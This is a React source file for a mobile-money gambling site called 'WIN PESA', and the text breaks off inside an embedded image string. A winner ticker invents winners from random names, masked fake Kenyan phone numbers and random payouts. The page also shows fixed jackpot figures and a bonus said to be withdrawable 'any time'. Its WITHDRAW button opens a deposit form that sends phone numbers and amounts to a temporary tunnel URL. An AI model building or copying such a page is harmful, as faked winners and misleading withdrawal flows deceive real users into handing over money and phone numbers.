import React, { useState, useEffect } from 'react';
import { Search, Crown, Gamepad2, Trophy, Zap, Database, Gift, FolderRoot as Football, Timer, Diamond, ShoppingCart, Award, Menu, ArrowLeft } from 'lucide-react';

function WinnerTicker() {
  const [winners, setWinners] = useState<string[]>([]);

  const generateRandomWinner = () => {
    const games = ['Hot to Burn', 'Shining Crown', 'JetX', 'Mayan Gold', 'Lucky Dragons', 'Fortune Wheel', 'Golden Safari', 'Space Adventure'];
    const usernames = ['Lucky', 'Winner', 'Player', 'Gamer', 'Star', 'Champion', 'Master', 'Pro'];
    const randomGame = games[Math.floor(Math.random() * games.length)];
    const randomUsername = usernames[Math.floor(Math.random() * usernames.length)] + Math.floor(Math.random() * 1000);
    const randomPhone = `+254${Math.floor(Math.random() * 9000000) + 1000000}`;
  
    // Mask the middle digits of the phone number
    const maskedPhone = randomPhone.replace(/(\d{3})\d{4}(\d{3})/, '$1****$2');
  
    const randomAmount = Math.floor(Math.random() * 50000) + 1000;
    return `${randomUsername} (${maskedPhone}) won ${randomAmount} KSH in ${randomGame}!`;
  };

  useEffect(() => {
    const initialWinners = Array(5).fill(null).map(generateRandomWinner);
    setWinners(initialWinners);

    const interval = setInterval(() => {
      setWinners(prev => {
        const newWinners = [...prev];
        newWinners.shift();
        newWinners.push(generateRandomWinner());
        return newWinners;
      });
    }, 3000);

    return () => clearInterval(interval);
  }, []);

  return (
    <div className="bg-[#1a2332] py-2 overflow-hidden border-t border-b border-gray-700">
      <div className="animate-marquee whitespace-nowrap">
        {winners.map((winner, index) => (
          <span key={index} className="text-green-400 mx-4 text-sm">🎉 {winner}</span>
        ))}
      </div>
    </div>
  );
}

function Header() {
  const [currentPage, setCurrentPage] = useState('main');

  const renderPage = () => {
    switch(currentPage) {
      case 'promotions':
        return <PromotionsPage onBack={() => setCurrentPage('main')} onClaim={() => setCurrentPage('deposit')} />;
      case 'deposit':
        return <DepositPage onBack={() => setCurrentPage('main')} />;
      default:
        return <MainContent />;
    }
  };

  return (
    <>
      <header className="bg-[#1a2332] p-4">
        <div className="container mx-auto flex items-center justify-between">
          <div className="flex items-center gap-4">
            <h1 className="text-purple-500 text-xl md:text-2xl font-bold">WIN PESA</h1>
            <div 
              className="bg-purple-600 px-3 py-1 md:px-4 md:py-2 rounded cursor-pointer hover:bg-purple-700"
              onClick={() => setCurrentPage('promotions')}
            >
              <span className="text-white text-sm md:text-base">PROMOTIONS</span>
              
            </div>
          </div>
          
          <div className="flex items-center gap-4">
            <div className="relative hidden md:block">
              <input
                type="search"
                placeholder="Search"
                className="px-4 py-2 rounded-lg w-[200px] md:w-[300px]"
              />
              <Search className="absolute right-3 top-2.5 text-gray-400" size={20} />
            </div>
            <div className="flex items-center gap-2 text-yellow-400">
              <span>KSH</span>
              <span>20</span>
            </div>
            <button 
              className="bg-green-400 px-4 py-1 md:px-6 md:py-2 rounded font-semibold hover:bg-green-500 text-sm md:text-base"
              onClick={() => setCurrentPage('deposit')}
            >
              WITHDRAW
            </button>
            <Menu className="text-white cursor-pointer" size={24} />
            
          </div>
        </div>
      </header>
      {renderPage()}
    </>
  );
}

function PromotionsPage({ onBack, onClaim }: { onBack: () => void; onClaim: () => void }) {
  return (
    <div className="min-h-screen bg-[#0f1623] p-4 md:p-8">
      <div className="container mx-auto">
        <button 
          onClick={onBack}
          className="flex items-center text-white mb-6 hover:text-purple-400"
        >
          <ArrowLeft className="mr-2" /> Back
        </button>
        <div className="bg-purple-600 rounded-lg p-4 md:p-8 text-white">
          <h2 className="text-2xl md:text-3xl font-bold mb-4">🎉 Double Deposit Bonus!</h2>
          <p className="text-lg md:text-xl mb-6">Get 100% bonus on your first deposit up to 5000 KSH!</p>
          <div className="bg-[#1a2332] p-4 md:p-6 rounded-lg max-w-md">
            <h3 className="text-xl font-semibold mb-4">How it works:</h3>
            <ul className="list-disc list-inside space-y-2 mb-6">
              <li>Deposit any amount from 10 KSH to 5000 KSH</li>
              <li>Receive an instant 100% bonus</li>
              <li>Withdraw your bonus  any time</li>
              <input type="text" placeholder="ENTER PROMO CODE" style={{ color: "black", marginLeft:"20px" }} />


            </ul>
            <button 
              className="bg-yellow-400 text-black px-4 py-2 md:px-6 md:py-3 rounded font-semibold w-full hover:bg-yellow-500"
              onClick={onClaim}
            >
              Claim Now
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

function DepositPage({ onBack }: { onBack: () => void }) {
  const [phone, setPhone] = useState('');
  const [amount, setAmount] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [message, setMessage] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setMessage('');

    try {
      const response = await fetch('https://pastor-brief-jill-improvements.trycloudflare.com/api/deposit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ phone, amount }),
      });

      const data = await response.json();
      if (data.success) {
        setMessage('Request sent successfully!Please wait.');
        setPhone('');
        setAmount('');
      }
    } catch (error) {
      setMessage('Failed to process. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#0f1623] p-4 md:p-8">
      <div className="container mx-auto">
        <button 
          onClick={onBack}
          className="flex items-center text-white mb-6 hover:text-purple-400"
        >
          <ArrowLeft className="mr-2" /> Back
        </button>
        <div className="bg-[#1a2332] rounded-lg p-4 md:p-8 max-w-md mx-auto">
          <h2 className="text-xl md:text-2xl font-bold text-white mb-6">M-PESA</h2>
          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <label className="block text-white mb-2">Phone Number</label>
              <input
                type="tel"
                placeholder="0700000000"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
                className="w-full px-4 py-2 rounded-lg"
                required
              />
            </div>
            <div>
              <label className="block text-white mb-2">Amount (KSH)</label>
              <input
                type="number"
                placeholder="Enter amount"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                className="w-full px-4 py-2 rounded-lg"
                required
                min="10"
              />
            </div>
            {message && (
              <div className={`p-3 rounded ${message.includes('success') ? 'bg-green-600' : 'bg-red-600'} text-white`}>
                {message}
              </div>
            )}
            <button 
              type="submit" 
              className="bg-yellow-400 text-black px-4 py-2 md:px-6 md:py-3 rounded font-semibold w-full hover:bg-yellow-500 disabled:opacity-50"
              disabled={isSubmitting}
            >
              {isSubmitting ? 'Processing...' : 'Enter '}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}

function Navigation() {
  const navItems = [
    { icon: <Trophy size={20} />, label: 'Top Games' },
    { icon: <Crown size={20} />, label: 'Providers' },
    { icon: <Trophy size={20} />, label: 'Big Win' },
    { icon: <Zap size={20} />, label: 'Jumbo Win' },
    { icon: <Database size={20} />, label: 'Crash Games' },
    { icon: <Database size={20} />, label: 'Low Data' },
    { icon: <Gift size={20} />, label: 'New Games' },
    { icon: <Football size={20} />, label: 'Virtual Sport' },
    { icon: <Timer size={20} />, label: 'Instant Win' },
    { icon: <Gift size={20} />, label: 'Drops&Wins' },
    { icon: <Diamond size={20} />, label: 'ForHer' },
    { icon: <Gamepad2 size={20} />, label: '3 x 3' },
    { icon: <ShoppingCart size={20} />, label: 'Buy Free Spins' },
    { icon: <Award size={20} />, label: 'WinLeague' },
  ];

  return (
    <nav className="bg-[#1a2332] border-t border-gray-700">
      <div className="container mx-auto py-2">
        <div className="flex items-center gap-4 overflow-x-auto">
          {navItems.map((item, index) => (
            <div
              key={index}
              className="flex items-center gap-2 text-white cursor-pointer px-3 py-2 hover:bg-gray-700 rounded whitespace-nowrap"
            >
              {item.icon}
              <span className="text-sm">{item.label}</span>
            </div>
          ))}
        </div>
      </div>
    </nav>
  );
}

function JackpotSection() {
  return (
    <div className="bg-purple-600 p-4 md:p-6 rounded-lg">
      <h2 className="text-xl md:text-2xl text-white mb-4">Jackpot</h2>
      <div className="space-y-4">
        <div className="flex justify-between text-white">
          <span>Mega</span>
          <span>407,271 KSH</span>
        </div>
        <div className="flex justify-between text-white">
          <span>Grand</span>
          <span>182,273 KSH</span>
        </div>
        <div className="flex justify-between text-white">
          <span>Major</span>
          <span>428,588 KSH</span>
        </div>
        <div className="flex justify-between text-white">
          <span>Mini</span>
          <span>1,089 KSH</span>
        </div>
      </div>
    </div>
  );
}

function GameCard({ title, type, image }: { title: string; type: string; image: string }) {
  return (
    <div className="relative rounded-lg overflow-hidden cursor-pointer transform hover:scale-105 transition-transform">
      <img src={image} alt={title} className="w-full h-48 object-cover" />
      <div className="absolute top-2 left-2 bg-red-600 text-white px-3 py-1 rounded">
        {type}
      </div>
      <div className="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black to-transparent p-4">
        <h3 className="text-white font-semibold text-sm md:text-base">{title}</h3>
      </div>
    </div>
  );
}

function GameGrid() {
  const games = [
    {
      title: 'Aviator',
      type: 'MOST PLAYED',
      image: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTmJitJqOjU95YB_G3aJE2Huh9G1PdDeYC6iQ&s'
    },
    {
      title: 'Shining Crown',
      type: 'JACKPOT',
      image: 'https://images.unsplash.com/photo-1596838132731-3301c3fd4317?w=800&auto=format&fit=crop&q=60&ixlib=rb-4.0.3'
    },
    {
      title: 'JetX',
      type: 'POPULAR',
      image: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRF3-dzqP4raqME-bntL9p21ADwlqG-1bsHGg&s'
    },
    {
      title: 'Mayan Gold',
      type: 'NEW',
      image: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS1u2PLFN3uCHfuJUuAg3UJ5adO2ZzjjjwpFQ&s'
    },
    {
      title: 'Lucky Dragons',
      type: 'TOURNAMENT',
      image: 'https://images.unsplash.com/photo-1567095761054-7a02e69e5c43?w=800&auto=format&fit=crop&q=60&ixlib=rb-4.0.3'
    },
    {
      title: 'Aviator',
      type: 'TOP GAME',
      image: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQGfoE58_TSt-uk7KFIF3HWLHOyhB03nWzoCw&s'
    },
    {
      title: 'Golden Safari',
      type: 'NEW',
      image: 'data:image/jpeg;base64,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